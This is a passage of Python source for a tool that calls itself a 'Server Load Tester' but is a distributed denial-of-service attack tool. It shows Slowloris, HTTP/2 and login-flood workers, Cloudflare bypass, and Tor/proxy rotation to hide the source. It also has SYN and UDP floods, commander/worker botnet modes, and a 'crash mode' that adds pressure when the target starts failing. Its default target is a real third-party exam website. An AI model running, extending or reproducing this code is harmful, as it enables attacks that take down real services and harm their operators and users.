        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            urls = random.sample(resources, min(3, len(resources)))
            for url in urls:
                if self._stop.is_set(): break
                result = await self._hit_resource(session, url)
                self._record(result)
                if not result.ok:
                    consecutive_fails += 1
                    await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
                else:
                    consecutive_fails = 0
            await asyncio.sleep(0.01)

    async def _worker_slowloris(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            result = await self._slowloris(session)
            self._record(result)

    async def _worker_script(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        if not self.script_engine: return
        while not self._stop.is_set():
            steps = self.script_engine.script.get('steps', [])
            for step in steps:
                if self._stop.is_set(): break
                ok, hint, rt = await self.script_engine.execute_step(session, step)
                result = HitResult(ok=ok, code=None, rt=rt, mode="script", hint=hint)
                self._record(result)
                await self.live_log.add("script", None, rt, None if ok else hint, "", hint)
                delay_ms = self.script_engine.script.get('delay_ms', 10)
                await asyncio.sleep(delay_ms / 1000)
            if not self.script_engine.script.get('loop', True):
                break

    async def _worker_http2(self, delay=0):
        if not HAS_HTTPX:
            return
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0

        async with httpx.AsyncClient(http2=True, verify=False, timeout=20) as client:
            while not self._stop.is_set():
                t = time.time()
                try:
                    url = self._select_weighted_page(self._get_target_urls()[0])
                    sep = '&' if '?' in url else '?'
                    busted = f"{url}{sep}{rand_cache_bust()}"
                    headers = self._base_headers()
                    proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None

                    resp = await client.get(busted, headers=headers, proxy=proxy)
                    elapsed = time.time() - t
                    result = HitResult(
                        ok=resp.status_code < 500, code=resp.status_code,
                        rt=elapsed, mode="page",
                        hint=f"H2 {resp.status_code} ({len(resp.content):,}B)", url=url,
                    )
                    self._record(result)
                    await self.live_log.add("http2", resp.status_code, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
                    consecutive_fails = 0
                    await asyncio.sleep(0.01)
                except Exception as e:
                    elapsed = time.time() - t
                    result = HitResult(ok=False, code=None, rt=elapsed, mode="page",
                                           err=type(e).__name__, url=url)
                    self._record(result)
                    await self.live_log.add("http2", None, elapsed, type(e).__name__, url)
                    self.health_monitor.record(result)
                    consecutive_fails += 1
                    await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))

    def _spawn_worker(self, session, all_tasks, login_pct, page_pct,
                      resource_pct, slowloris_pct, script_pct, http2_pct, pages, resources):
        r = random.random()
        delay = random.uniform(0, 2.0)

        if r < login_pct:
            t = asyncio.create_task(self._worker_login(session, delay=delay))
        elif r < login_pct + page_pct:
            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
        elif r < login_pct + page_pct + resource_pct:
            t = asyncio.create_task(self._worker_resource(session, resources, delay=delay))
        elif r < login_pct + page_pct + resource_pct + slowloris_pct:
            t = asyncio.create_task(self._worker_slowloris(session, delay=delay))
        elif r < login_pct + page_pct + resource_pct + slowloris_pct + script_pct:
            t = asyncio.create_task(self._worker_script(session, delay=delay))
        elif self.enable_http2:
            t = asyncio.create_task(self._worker_http2(delay=delay))
        else:
            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
        all_tasks.append(t)
        self.stats.t1 = time.time()

    def _render_dashboard(self, cur: int, max_w: int, step: int, mode: str,
                          health: float, trend: str, step_dur: int, step_remaining: float):
        """Render the TUI dashboard with live log"""
        # Health color
        if health > 0.7:
            hc = C.G
        elif health > 0.4:
            hc = C.Y
        else:
            hc = C.R

        # Mode display
        mode_colors = {
            "NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}"
        }
        mc = mode_colors.get(mode, C.W)
        if mode == "MAXIMUM":
            mode_display = f"{mc}MAXIMUM{C.RS}"
        elif mode == "CRASH":
            mode_display = f"{mc}CRASH{C.RS}"
        elif mode == "PRESSURE":
            mode_display = f"{mc}PRESSURE{C.RS}"
        else:
            mode_display = f"{mc}NORMAL{C.RS}"

        # Trend arrow
        trend_icons = {"improving": f"{C.G}^{C.RS}", "degrading": f"{C.R}v{C.RS}", "stable": f"{C.Y}={C.RS}", "unknown": "?"}
        trend_icon = trend_icons.get(trend, "?")

        # Health bar
        bar_len = 10
        filled = int(health * bar_len)
        bar = f"{hc}{'|' * filled}{C.DM}{'.' * (bar_len - filled)}{C.RS}"

        rps = self.stats.rrps
        cf_s = f" CFB:{self.stats.cf_solved}" if self.enable_cfb else ""

        # Stats line
        line1 = (f"  {mode_display} | {C.CY}{self.stats.dur:.0f}s{C.RS} | "
                f"W:{cur:,}/{max_w:,} | "
                f"Total:{self.stats.total:,} | "
                f"{C.G}OK:{self.stats.ok:,}{C.RS} {C.R}FAIL:{self.stats.fail:,}{C.RS} | "
                f"RPS:{rps:.0f}/s{cf_s}")

        # Health line
        line2 = (f"  Health:{bar} {hc}{health:.0%}{C.RS} {trend_icon} | "
                f"RT:{self.stats.rart*1000:.0f}ms | "
                f"Step:+{step} every {step_dur}s | "
                f"Next:{step_remaining:.0f}s | "
                f"{C.DM}[+/-] Workers [q] Quit{C.RS}")

        # Live request log
        log_lines = self.live_log.get_lines()
        log_display = []
        for entry in log_lines[-8:]:
            log_display.append(self.live_log.format_line(entry))

        # Pad log to always show 8 lines
        while len(log_display) < 8:
            log_display.append(f"  {C.DM}{'.'*60}{C.RS}")

        return line1, line2, log_display

    async def run(self, max_workers=2000, step=100, step_dur=5):
        self.stats = Stats()
        self.stats.t0 = time.time()
        actual_max = min(max_workers, self.safe_max)

        connector = aiohttp.TCPConnector(
            limit=actual_max + 500,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=30,
            keepalive_timeout=30,
        )

        async with aiohttp.ClientSession(connector=connector, timeout=self.timeout) as session:
            ok = await self._detect_and_discover(session)
            if not ok:
                print(f"  {C.R}[ERROR] Connection failed{C.RS}")
                return

            pages, resources = self._get_target_urls()

            # Worker distribution
            login_pct = 0.45
            page_pct = 0.25
            resource_pct = 0.15
            slowloris_pct = 0.05 if self.enable_slowloris else 0.0
            script_pct = 0.05 if self.script_engine else 0.0
            http2_pct = 0.05 if self.enable_http2 else 0.0
            remaining = 1.0 - login_pct - page_pct - resource_pct - slowloris_pct - script_pct - http2_pct
            if remaining > 0:
                page_pct += remaining

            print(f"\n{'='*72}")
            print(f"  {C.BD}{C.R}Server Load Tester v4 — Ultimate{C.RS}")
            print(f"{'='*72}")
            print(f"  Target:     {C.W}{self.login_url}{C.RS}")
            if self.detected_waf: print(f"  WAF:        {C.Y}{self.detected_waf.upper()}{C.RS}")
            print(f"  Workers:    {C.BD}{actual_max:,}{C.RS}")
            print(f"  Auth:       {int(actual_max*login_pct):,} ({int(login_pct*100)}%)")
            print(f"  Pages:      {int(actual_max*page_pct):,} ({int(page_pct*100):.0f}%)")
            print(f"  Resources:  {int(actual_max*resource_pct):,} ({int(resource_pct*100)}%)")
            if self.enable_slowloris: print(f"  Slowloris:  {int(actual_max*slowloris_pct):,} (5%)")
            if self.script_engine: print(f"  Script:     {int(actual_max*script_pct):,} (5%)")
            if self.enable_http2: print(f"  HTTP/2:     {int(actual_max*http2_pct):,} (5%)")
            if self.enable_cfb: print(f"  CFB:        {C.G}Enabled{C.RS}")
            if self.proxy_manager: print(f"  Proxies:    {C.G}{len(self.proxy_manager.proxies)} proxies{C.RS}")
            print(f"  Step:       +{step} every {step_dur}s")
            print(f"  Controls:   {C.BD}[+]{C.RS} Add workers  {C.BD}[-]{C.RS} Remove  {C.BD}[q]{C.RS} Quit")
            print(f"{'='*72}\n")

            # Start keyboard handler
            await self.keyboard.start()

            all_tasks = []
            cur = 0
            self.peak_workers = 0
            self.ceiling_workers = 0
            self.limit_hit = False

            # Tor circuit renewal
            if self.proxy_manager and self.proxy_manager.tor_enabled:
                async def tor_renewer():
                    while not self._stop.is_set():
                        await asyncio.sleep(60)
                        await self.proxy_manager.renew_tor_circuit()
                asyncio.create_task(tor_renewer())

            while not self._stop.is_set():
                # === Handle keyboard input ===
                key = self.keyboard.get_key()
                if key == '+':
                    self._manual_delta += step
                    print(f"\n  {C.G}[KEY] +{step} workers (manual){C.RS}")
                elif key == '-':
                    self._manual_delta -= step
                    print(f"\n  {C.Y}[KEY] -{step} workers (manual){C.RS}")
                elif key == 'q':
                    print(f"\n  {C.Y}[KEY] Quitting...{C.RS}")
                    self._stop.set()
                    break

                # === Smart Crash Mode: Get pressure advice from health monitor ===
                mode, worker_delta = self.health_monitor.get_pressure_advice(
                    cur, actual_max, step)

                # Apply manual delta
                if self._manual_delta > 0:
                    # User pressed +: add workers
                    add_count = min(self._manual_delta, actual_max - cur)
                    if add_count > 0:
                        cur += add_count
                        for _ in range(add_count):
                            self._spawn_worker(session, all_tasks, login_pct, page_pct,
                                               resource_pct, slowloris_pct, script_pct, http2_pct, pages, resources)
                    self._manual_delta = 0
                elif self._manual_delta < 0:
                    # User pressed -: remove workers
                    remove_count = min(abs(self._manual_delta), cur)
                    if remove_count > 0:
                        for _ in range(remove_count):
                            if all_tasks:
                                t = all_tasks.pop()
                                t.cancel()
                        cur -= remove_count
                    self._manual_delta = 0

                # === Apply Smart Crash Mode ===
                if worker_delta > 0 and cur < actual_max:
                    new = min(worker_delta, actual_max - cur)
                    if new > 0:
                        cur += new
                        if mode == "MAXIMUM":
                            print(f"\n  {C.BD}{C.R}[!!!] SERVER DYING — MAXIMUM PRESSURE +{new} -> {cur:,}{C.RS}")
                        elif mode == "CRASH":
                            print(f"\n  {C.R}[CRASH] Server failing — +{new} workers -> {cur:,}{C.RS}")
                        elif mode == "PRESSURE":
                            print(f"\n  {C.Y}[PRESS] Server struggling — +{new} workers -> {cur:,}{C.RS}")
                        else:
                            print(f"\n  {C.M}[SCALE] +{new} -> {cur:,} workers{C.RS}")
                        for _ in range(new):
                            self._spawn_worker(session, all_tasks, login_pct, page_pct,
                                               resource_pct, slowloris_pct, script_pct, http2_pct, pages, resources)

                self.stats.users = cur

                # === Render TUI Dashboard ===
                step_t0 = time.time()
                while time.time() - step_t0 < step_dur and not self._stop.is_set():
                    health = self.health_monitor.health_score
                    trend = self.health_monitor.trend
                    step_remaining = step_dur - (time.time() - step_t0)
                    line1, line2, log_display = self._render_dashboard(
                        cur, actual_max, step, mode, health, trend, step_dur, step_remaining)

                    # Clear and redraw
                    total_lines = 2 + 8 + 2  # stats + log + separators
                    sys.stdout.write(f"\033[{total_lines}A")  # Move cursor up
                    sys.stdout.write(C.clear_line() + "\r" + line1 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + line2 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                    for log_line in log_display:
                        sys.stdout.write(C.clear_line() + "\r" + log_line + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                    sys.stdout.flush()

                    await asyncio.sleep(0.5)

                self._snap()

            # === Cleanup ===
            await self.keyboard.stop()
            self._stop.set()
            if all_tasks:
                done, pending = await asyncio.wait(all_tasks, timeout=3)
                for t in pending: t.cancel()

    def _snap(self):
        self._snaps.append({
            "t": self.stats.dur, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": self.stats.rrps, "art": self.stats.rart,
            "users": self.stats.users, "rl": self.stats.rate_limited,
            "cap": self.stats.captcha, "cf": self.stats.cf_solved,
            "logins": self.stats.login_fail + self.stats.login_ok,
            "pages": self.stats.page_hits, "resources": self.stats.resource_hits,
            "slowloris": self.stats.slowloris_hits, "script": self.stats.script_hits,
            "health": self.health_monitor.health_score,
        })


# ═══════════════════════════════════════════════════════════════════════════════
# Report
# ═══════════════════════════════════════════════════════════════════════════════

def report(st, url, snaps, tester):
    print(f"\n\n{'='*72}")
    print(f"  {C.BD}{C.R}Report v4 — Ultimate{C.RS}")
    print(f"{'='*72}")
    print(f"  Target: {url}")
    if tester.detected_waf: print(f"  WAF:    {tester.detected_waf.upper()}")
    if tester.enable_cfb: print(f"  CFB Solved: {st.cf_solved}")
    if tester.health_monitor.health_score < 0.5:
        print(f"  {C.R}Server Health at End: {tester.health_monitor.health_score:.0%} (DEGRADED){C.RS}")
    print(f"{'─'*72}")

    print(f"\n  +-- {C.BD}Summary{C.RS} ------------------------------------------------+")
    print(f"  | Duration:    {st.dur:.1f}s ({st.dur/60:.1f} min)")
    print(f"  | Total:       {st.total:,}")
    print(f"  | OK:          {C.G}{st.ok:,}{C.RS}")
    print(f"  | Failed:      {C.R}{st.fail:,}{C.RS}")
    print(f"  | RPS:         {st.rps:.1f}")
    if snaps: print(f"  | Max RPS:     {max(s['rps'] for s in snaps):.1f}")
    if snaps: print(f"  | Min Health:  {min(s.get('health', 1.0) for s in snaps):.0%}")
    print(f"  +---------------------------------------------------+")

    logins = st.login_fail + st.login_ok
    print(f"\n  +-- {C.BD}Breakdown{C.RS} ----------------------------------------------+")
    if st.total:
        print(f"  | Auth:      {logins:,} ({logins/st.total*100:.1f}%)")
        print(f"  | Pages:     {st.page_hits:,} ({st.page_hits/st.total*100:.1f}%)")
        print(f"  | Resources: {st.resource_hits:,} ({st.resource_hits/st.total*100:.1f}%)")
        if st.slowloris_hits: print(f"  | Slowloris: {st.slowloris_hits:,}")
        if st.script_hits: print(f"  | Script:    {st.script_hits:,}")
        if st.cf_solved: print(f"  | CF Bypass: {st.cf_solved:,}")
    print(f"  +---------------------------------------------------+")

    print(f"\n  +-- {C.BD}{C.R}Security{C.RS} ----------------------------------------------+")
    print(f"  | Rate Limit: {'ACTIVE' if st.rate_limited > 0 else 'Not detected'}")
    print(f"  | CAPTCHA:    {'ACTIVE' if st.captcha > 0 else 'Not detected'}")
    print(f"  | Lockout:    {'ACTIVE' if st.locked > 0 else 'Not detected'}")
    print(f"  +---------------------------------------------------+")

    # Crash Mode Summary
    if tester.health_monitor.crash_mode_active or any(s.get('health', 1.0) < 0.5 for s in snaps[-5:]):
        print(f"\n  +-- {C.BD}{C.R}Crash Mode{C.RS} --------------------------------------------+")
        print(f"  | Final Health: {tester.health_monitor.health_score:.0%}")
        print(f"  | Health Trend: {tester.health_monitor.trend}")
        print(f"  | Server Dying: {'YES' if tester.health_monitor.server_dying else 'NO'}")
        if tester.health_monitor._timeout_streak > 0:
            print(f"  | Timeout Streak: {tester.health_monitor._timeout_streak}")
        print(f"  +---------------------------------------------------+")

    if tester.proxy_manager:
        print(f"\n  +-- {C.BD}Proxies{C.RS} ------------------------------------------------+")
        print(f"  | Count: {len(tester.proxy_manager.proxies)}")
        print(f"  | Tor:   {'ACTIVE' if tester.proxy_manager.tor_enabled else 'OFF'}")
        print(f"  +---------------------------------------------------+")

    # Status code breakdown
    if st.codes:
        print(f"\n  +-- {C.BD}Status Codes{C.RS} -------------------------------------------+")
        for code in sorted(st.codes.keys()):
            count = st.codes[code]
            if code < 300: cc = C.G
            elif code < 400: cc = C.Y
            elif code < 500: cc = C.Y
            else: cc = C.R
            print(f"  | {cc}{code}{C.RS}: {count:,} ({count/st.total*100:.1f}%)")
        print(f"  +---------------------------------------------------+")

    print(f"\n{'='*72}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

DEFAULT_URL = "https://behsamooz.ir/student/run-descriptive-exam/dbe11389-6684-44d6-a2ce-8022f49a889b"

def parse_args():
    p = argparse.ArgumentParser(
        description="Server Load Tester v4 — Ultimate",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Keyboard Controls during run:\n  +  Add workers\n  -  Remove workers\n  q  Quit\n")
    p.add_argument("--url", default=DEFAULT_URL, help="Target URL")
    p.add_argument("--max-workers", type=int, default=100000, help="Maximum workers")
    p.add_argument("--step", type=int, default=500, help="Workers per step")
    p.add_argument("--step-duration", type=int, default=3, help="Seconds between steps")
    p.add_argument("--timeout", type=int, default=20, help="Request timeout (seconds)")
    p.add_argument("--safe-max", type=int, default=100000, help="Safety cap on workers")

    # v3 features
    p.add_argument("--slowloris", action="store_true", help="Enable Slowloris")
    p.add_argument("--cfb", action="store_true", help="Cloudflare Bypass")
    p.add_argument("--http2", action="store_true", help="Use HTTP/2 (httpx)")
    p.add_argument("--tor", action="store_true", help="Route through Tor")
    p.add_argument("--proxy-file", default=None, help="Proxy list file")
    p.add_argument("--syn-flood", action="store_true", help="SYN Flood (needs root)")
    p.add_argument("--udp-flood", action="store_true", help="UDP Flood (needs root)")
    p.add_argument("--syn-pps", type=int, default=5000, help="SYN packets/sec")
    p.add_argument("--udp-pps", type=int, default=5000, help="UDP packets/sec")
    p.add_argument("--script", default=None, help="JSON script file")

    # Distributed
    p.add_argument("--commander", action="store_true", help="Commander mode")
    p.add_argument("--worker", default=None, help="Connect to Commander (ip:port)")
    p.add_argument("--port", type=int, default=DISTRIBUTED_PORT, help="Commander port")
    return p.parse_args()


async def main():
    args = parse_args()

    # Distributed Worker mode
    if args.worker:
        worker = Worker(args.worker)
        if sys.platform != "win32":
            try:
                loop = asyncio.get_event_loop()
                for sig in (signal.SIGINT, signal.SIGTERM):
                    loop.add_signal_handler(sig, worker.stop)
            except Exception:
                pass
        await worker.start()
        return

    # Commander mode
    if args.commander:
        commander = Commander(args.port)
        config = {
            'url': args.url, 'max_workers': args.max_workers,
            'step': args.step, 'step_dur': args.step_duration,
            'timeout': args.timeout, 'safe_max': args.safe_max,
            'slowloris': args.slowloris, 'cfb': args.cfb,
            'http2': args.http2, 'tor': args.tor,
            'proxy_file': args.proxy_file, 't0': time.time(),
        }
        if sys.platform != "win32":
            try:
                loop = asyncio.get_event_loop()
                for sig in (signal.SIGINT, signal.SIGTERM):
                    loop.add_signal_handler(sig, commander.stop)
            except Exception:
                pass
        await commander.start(config)
        return

    # Normal mode
    print(f"\n  {C.CY}Target: {C.W}{args.url}{C.RS}")
    print(f"  {C.CY}Enter new URL or press Enter:{C.RS}")
    try:
        user_input = input(f"  {C.BD}>{C.RS} ").strip()
        target_url = user_input if user_input else args.url
    except KeyboardInterrupt:
        return

    if not target_url.startswith("http"):
        print(f"  {C.R}[ERROR] Invalid URL{C.RS}")
        return

    # Layer 3/4 attacks (standalone)
    if args.syn_flood or args.udp_flood:
        parsed = urlparse(target_url)
        target_ip = socket.gethostbyname(parsed.hostname)
        l34 = Layer34Attacker(target_ip, parsed.port or 80)

        if args.syn_flood:
            asyncio.create_task(l34.syn_flood(args.syn_pps))
        if args.udp_flood:
            asyncio.create_task(l34.udp_flood(args.udp_pps))

        print(f"  {C.R}[L34] Layer 3/4 attacks active{C.RS}")
        print(f"  [L34] Ctrl+C to stop")
        try:
            while True:
                await asyncio.sleep(1)
                print(f"\r  SYN:{l34.stats['syn_sent']:,} UDP:{l34.stats['udp_sent']:,} ERR:{l34.stats['errors']:,}", end="", flush=True)
        except KeyboardInterrupt:
            l34.stop()
        return

    # Layer 7 load test
    tester = CombinedTester(
        login_url=target_url,
        timeout=args.timeout,
        safe_max=args.safe_max,
        enable_slowloris=args.slowloris,
        enable_cfb=args.cfb,
        enable_http2=args.http2,
        tor_enabled=args.tor,
        proxy_file=args.proxy_file,
        script_path=args.script,
    )

    if sys.platform != "win32":
        try:
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, tester.stop)
        except Exception:
            pass

    # Print initial blank lines for TUI dashboard
    print(f"\n" * 12)

    try:
        await tester.run(max_workers=args.max_workers, step=args.step, step_dur=args.step_duration)
    except KeyboardInterrupt:
        tester.stop()
        print(f"\n\n  {C.Y}[WARN] Ctrl+C received{C.RS}")
    except Exception as e:
        print(f"\n  {C.R}[ERROR] {e}{C.RS}")
    finally:
        # Restore terminal
        await tester.keyboard.stop()
        report(tester.stats, target_url, tester._snaps, tester)

        # Save JSON report
        try:
            data = {
                "target": target_url, "waf": tester.detected_waf,
                "duration": tester.stats.dur, "total": tester.stats.total,
                "ok": tester.stats.ok, "fail": tester.stats.fail,
                "cf_solved": tester.stats.cf_solved,
                "final_health": tester.health_monitor.health_score,
                "timeline": tester._snaps,
            }
            with open("load_test_report.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception:
            pass


if __name__ == "__main__":
    asyncio.run(main())
